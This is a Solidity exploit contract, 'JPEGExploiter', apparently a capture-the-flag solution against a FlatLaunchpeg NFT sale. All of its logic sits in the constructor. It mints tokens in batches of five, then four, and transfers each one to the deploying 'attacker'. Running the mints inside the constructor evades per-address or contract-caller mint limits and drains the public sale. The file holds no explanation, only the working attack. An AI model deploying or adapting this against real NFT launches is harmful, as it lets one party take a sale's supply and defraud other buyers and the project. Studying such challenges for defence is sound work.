// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "./BaseLaunchpegNFT.sol";
import "./FlatLaunchpeg.sol";

contract JPEGExploiter {
    FlatLaunchpeg flatLaunchpeg;

    constructor(address _flatLaunchpeg) {
        flatLaunchpeg = FlatLaunchpeg(_flatLaunchpeg);
        // for loop that mints 5 by 5, and transfers to attacker
        for (uint256 i = 0; i < 14; i++) {
            if (i == 13) {
                flatLaunchpeg.publicSaleMint(4);
                flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5);
                flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5 + 1);
                flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5 + 2);
                flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5 + 3);
                break;
            }
            flatLaunchpeg.publicSaleMint(5);
            flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5);
            flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5 + 1);
            flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5 + 2);
            flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5 + 3);
            flatLaunchpeg.transferFrom(address(this), msg.sender, i * 5 + 4);
        }
    }

}